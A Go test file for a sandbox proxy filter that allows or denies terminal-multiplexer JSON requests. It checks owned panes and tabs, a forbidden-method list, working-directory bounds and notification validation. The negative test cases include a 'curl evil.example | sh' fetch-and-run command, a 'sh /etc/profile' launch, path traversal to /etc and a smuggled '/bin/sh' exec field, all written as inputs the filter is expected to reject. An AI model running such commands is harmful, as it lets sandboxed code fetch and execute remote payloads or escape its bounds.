package herdrproxy

import (
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"devsandbox/internal/cmdpattern"
)

// filterFixture wires a filter the way the tool layer does.
type filterFixture struct {
	filter     *Filter
	tabs       *cmdpattern.OwnedSet[string]
	panes      *cmdpattern.OwnedSet[string]
	projectDir string
	scriptPath string
}

func newFilterFixture(t *testing.T, caps ...Capability) *filterFixture {
	t.Helper()
	if len(caps) == 0 {
		caps = []Capability{CapLaunchOverlay, CapNotify}
	}

	base := t.TempDir()
	projectDir := filepath.Join(base, "project")
	if err := os.MkdirAll(projectDir, 0o755); err != nil {
		t.Fatalf("mkdir project: %v", err)
	}

	reloc, err := NewRelocator(filepath.Join(base, "host-only"), nil)
	if err != nil {
		t.Fatalf("NewRelocator: %v", err)
	}
	t.Cleanup(func() { _ = reloc.Cleanup() })

	scriptPath := filepath.Join(projectDir, "revdiff-launch-abc")
	if err := os.WriteFile(scriptPath, []byte(validBody()), 0o600); err != nil {
		t.Fatalf("write launch script: %v", err)
	}

	tabs := cmdpattern.NewOwnedSet[string]()
	panes := cmdpattern.NewOwnedSet[string]()

	return &filterFixture{
		filter: NewFilter(FilterConfig{
			Capabilities: caps,
			LaunchScript: testScriptPattern(),
			LaunchPatterns: []cmdpattern.CommandPattern{{
				Program:     "revdiff",
				ResolvedBin: testRevdiffBin,
				ArgsMatcher: cmdpattern.MatchAny(),
			}},
			OwnedTabs:   tabs,
			OwnedPanes:  panes,
			Relocator:   reloc,
			ProjectDir:  projectDir,
			WorkspaceID: "ws1",
		}),
		tabs:       tabs,
		panes:      panes,
		projectDir: projectDir,
		scriptPath: scriptPath,
	}
}

func TestDecideAllowsCapturedWireRequests(t *testing.T) {
	f := newFilterFixture(t)
	f.panes.Add("pane7")
	f.tabs.Add("tab3")

	tests := []struct {
		name string
		line string
	}{
		{
			name: "tab.create as the CLI sends it",
			line: `{"id":"cli:tab:create","method":"tab.create","params":{"workspace_id":"ws1","cwd":"` +
				f.projectDir + `","focus":true,"label":"rev"}}`,
		},
		{
			name: "pane run, which the CLI sends as pane.send_input",
			line: `{"id":"cli:request","method":"pane.send_input","params":{"pane_id":"pane7","text":"sh ` +
				f.scriptPath + `","keys":["Enter"]}}`,
		},
		{
			name: "tab.close on an owned tab",
			line: `{"id":"cli:tab:close","method":"tab.close","params":{"tab_id":"tab3"}}`,
		},
		{
			name: "notification.show",
			line: `{"id":"cli:notification:show","method":"notification.show","params":{"title":"hello world"}}`,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			d := f.filter.Decide([]byte(tt.line))
			if !d.Allow {
				t.Errorf("Decide denied a legitimate request: %s", d.Reason)
			}
		})
	}
}

func TestDecideDeniesForbiddenMethods(t *testing.T) {
	f := newFilterFixture(t)

	// The methods that make raw socket access unacceptable in the first place.
	forbidden := []string{
		"pane.read", "pane.send_text", "pane.send_keys", "pane.list", "pane.close",
		"agent.send", "agent.start", "agent.read",
		"server.stop", "server.reload_config", "server.live_handoff",
		"plugin.pane.open", "plugin.link", "plugin.action.invoke",
		"worktree.create", "worktree.remove", "worktree.open",
		"workspace.close", "workspace.create",
		"events.subscribe", "events.wait", "pane.wait_for_output",
		"layout.apply", "layout.export", "session.snapshot",
	}

	for _, m := range forbidden {
		t.Run(m, func(t *testing.T) {
			line := `{"id":"x","method":"` + m + `","params":{}}`
			if d := f.filter.Decide([]byte(line)); d.Allow {
				t.Errorf("Decide allowed forbidden method %q", m)
			}
		})
	}
}

func TestDecideDeniesUnownedMutations(t *testing.T) {
	f := newFilterFixture(t)
	// Deliberately register a different pane and tab.
	f.panes.Add("mine")
	f.tabs.Add("mine")

	tests := []struct {
		name string
		line string
	}{
		{
			name: "send_input into a pane the sandbox did not create",
			line: `{"id":"x","method":"pane.send_input","params":{"pane_id":"users-pane","text":"sh ` +
				f.scriptPath + `","keys":["Enter"]}}`,
		},
		{
			name: "close a tab the sandbox did not create",
			line: `{"id":"x","method":"tab.close","params":{"tab_id":"users-tab"}}`,
		},
		{
			name: "send_input with an empty pane id",
			line: `{"id":"x","method":"pane.send_input","params":{"pane_id":"","text":"sh ` +
				f.scriptPath + `","keys":["Enter"]}}`,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if d := f.filter.Decide([]byte(tt.line)); d.Allow {
				t.Error("Decide allowed a mutation against an unowned resource")
			}
		})
	}
}

func TestDecidePaneSendInputRejectsBadKeysAndText(t *testing.T) {
	f := newFilterFixture(t)
	f.panes.Add("pane7")

	tests := []struct {
		name   string
		params string
	}{
		{
			name:   "keys other than Enter",
			params: `{"pane_id":"pane7","text":"sh ` + f.scriptPath + `","keys":["Enter","Enter"]}`,
		},
		{
			name:   "no keys at all",
			params: `{"pane_id":"pane7","text":"sh ` + f.scriptPath + `"}`,
		},
		{
			name:   "arbitrary shell command instead of a launch",
			params: `{"pane_id":"pane7","text":"curl evil.example | sh","keys":["Enter"]}`,
		},
		{
			name:   "script path outside any known script",
			params: `{"pane_id":"pane7","text":"sh /etc/profile","keys":["Enter"]}`,
		},
		{
			name:   "unknown parameter smuggled alongside",
			params: `{"pane_id":"pane7","text":"sh ` + f.scriptPath + `","keys":["Enter"],"cwd":"/"}`,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			line := `{"id":"x","method":"pane.send_input","params":` + tt.params + `}`
			if d := f.filter.Decide([]byte(line)); d.Allow {
				t.Errorf("Decide allowed a bad send_input: %s", tt.params)
			}
		})
	}
}

// TestDecideRelocatesLaunchScript checks the rewrite actually happens and that
// the forwarded line no longer names the sandbox-writable path.
func TestDecideRelocatesLaunchScript(t *testing.T) {
	f := newFilterFixture(t)
	f.panes.Add("pane7")

	line := `{"id":"cli:request","method":"pane.send_input","params":{"pane_id":"pane7","text":"sh ` +
		f.scriptPath + `","keys":["Enter"]}}`

	d := f.filter.Decide([]byte(line))
	if !d.Allow {
		t.Fatalf("Decide denied a valid launch: %s", d.Reason)
	}
	if d.Rewritten == nil {
		t.Fatal("Decide did not rewrite the request; the sandbox path would still be executed")
	}
	if strings.Contains(string(d.Rewritten), f.scriptPath) {
		t.Error("rewritten request still names the sandbox-writable script path")
	}

	// Every other field must survive untouched.
	var out struct {
		ID     string `json:"id"`
		Method string `json:"method"`
		Params struct {
			PaneID string   `json:"pane_id"`
			Text   string   `json:"text"`
			Keys   []string `json:"keys"`
		} `json:"params"`
	}
	if err := json.Unmarshal(d.Rewritten, &out); err != nil {
		t.Fatalf("rewritten line is not valid JSON: %v", err)
	}
	if out.ID != "cli:request" || out.Method != "pane.send_input" {
		t.Errorf("rewrite altered id/method: %+v", out)
	}
	if out.Params.PaneID != "pane7" || len(out.Params.Keys) != 1 || out.Params.Keys[0] != "Enter" {
		t.Errorf("rewrite altered other params: %+v", out.Params)
	}
	if !strings.HasPrefix(out.Params.Text, "sh /") {
		t.Errorf("rewritten text = %q, want it to name the relocated script", out.Params.Text)
	}
}

func TestDecideTabCreateBoundsCwd(t *testing.T) {
	f := newFilterFixture(t)

	nested := filepath.Join(f.projectDir, "sub")
	if err := os.MkdirAll(nested, 0o755); err != nil {
		t.Fatalf("mkdir nested: %v", err)
	}

	// A symlink inside the project pointing out of it must not widen the bound.
	escape := filepath.Join(f.projectDir, "escape")
	if err := os.Symlink("/etc", escape); err != nil {
		t.Skipf("symlinks unavailable: %v", err)
	}

	tests := []struct {
		name string
		cwd  string
		want bool
	}{
		{name: "project dir itself", cwd: f.projectDir, want: true},
		{name: "nested inside project", cwd: nested, want: true},
		{name: "outside the project", cwd: "/etc", want: false},
		{name: "parent of the project", cwd: filepath.Dir(f.projectDir), want: false},
		{name: "symlink escaping the project", cwd: escape, want: false},
		{name: "traversal out of the project", cwd: f.projectDir + "/../../etc", want: false},
		{name: "relative path", cwd: "project", want: false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			line := `{"id":"x","method":"tab.create","params":{"cwd":"` + tt.cwd + `","label":"rev"}}`
			d := f.filter.Decide([]byte(line))
			if d.Allow != tt.want {
				t.Errorf("Decide allow = %v, want %v (reason: %s)", d.Allow, tt.want, d.Reason)
			}
		})
	}
}

func TestDecideTabCreatePinsWorkspace(t *testing.T) {
	f := newFilterFixture(t)

	allowed := `{"id":"x","method":"tab.create","params":{"workspace_id":"ws1","cwd":"` + f.projectDir + `"}}`
	if d := f.filter.Decide([]byte(allowed)); !d.Allow {
		t.Errorf("Decide denied the sandbox's own workspace: %s", d.Reason)
	}

	other := `{"id":"x","method":"tab.create","params":{"workspace_id":"ws-user","cwd":"` + f.projectDir + `"}}`
	if d := f.filter.Decide([]byte(other)); d.Allow {
		t.Error("Decide allowed a tab in a workspace the sandbox does not own")
	}
}

func TestDecideDeniesMalformedLines(t *testing.T) {
	f := newFilterFixture(t)

	for _, line := range []string{
		``,
		`{`,
		`[]`,
		`{"id":"x"}`,
		`{"id":"x","method":""}`,
		`{"id":"x","method":"tab.create","params":"not-an-object"}`,
	} {
		t.Run(line, func(t *testing.T) {
			if d := f.filter.Decide([]byte(line)); d.Allow {
				t.Errorf("Decide allowed a malformed line: %q", line)
			}
		})
	}
}

// TestDecideWithNoCapabilitiesDeniesEverything is the enforce-mode guarantee.
func TestDecideWithNoCapabilitiesDeniesEverything(t *testing.T) {
	f := NewFilter(FilterConfig{})

	for _, m := range []string{methodTabCreate, methodPaneSendInput, methodTabClose, methodNotificationShow} {
		t.Run(m, func(t *testing.T) {
			line := `{"id":"x","method":"` + m + `","params":{}}`
			if d := f.Decide([]byte(line)); d.Allow {
				t.Errorf("Decide allowed %q with no capabilities configured", m)
			}
		})
	}

	// ping is the deliberate exception: a liveness handshake that observes and
	// mutates nothing, always answered so `herdr status` works. Under
	// mode="enforce" this is the only method that gets a reply.
	t.Run("ping is answered even with no capabilities", func(t *testing.T) {
		if d := f.Decide([]byte(`{"id":"x","method":"ping","params":{}}`)); !d.Allow {
			t.Errorf("Decide denied ping: %s", d.Reason)
		}
	})
}

func TestDecideNotifyCapabilityDoesNotGrantLaunch(t *testing.T) {
	f := newFilterFixture(t, CapNotify)
	f.panes.Add("pane7")
	f.tabs.Add("tab3")

	notify := `{"id":"x","method":"notification.show","params":{"title":"hi"}}`
	if d := f.filter.Decide([]byte(notify)); !d.Allow {
		t.Errorf("notify capability denied notification.show: %s", d.Reason)
	}

	for _, m := range []string{methodTabCreate, methodPaneSendInput, methodTabClose} {
		line := `{"id":"x","method":"` + m + `","params":{}}`
		if d := f.filter.Decide([]byte(line)); d.Allow {
			t.Errorf("notify capability leaked access to %q", m)
		}
	}
}

func TestDecideNotificationShowValidation(t *testing.T) {
	f := newFilterFixture(t)

	tests := []struct {
		name   string
		params string
		want   bool
	}{
		{name: "title only", params: `{"title":"hi"}`, want: true},
		{name: "title and body", params: `{"title":"hi","body":"there"}`, want: true},
		{name: "empty title", params: `{"title":""}`, want: false},
		{name: "missing title", params: `{"body":"there"}`, want: false},
		{name: "oversized title", params: `{"title":"` + strings.Repeat("a", maxLabelBytes+1) + `"}`, want: false},
		{name: "unknown field", params: `{"title":"hi","exec":"/bin/sh"}`, want: false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			line := `{"id":"x","method":"notification.show","params":` + tt.params + `}`
			if d := f.filter.Decide([]byte(line)); d.Allow != tt.want {
				t.Errorf("allow = %v, want %v (reason: %s)", d.Allow, tt.want, d.Reason)
			}
		})
	}
}
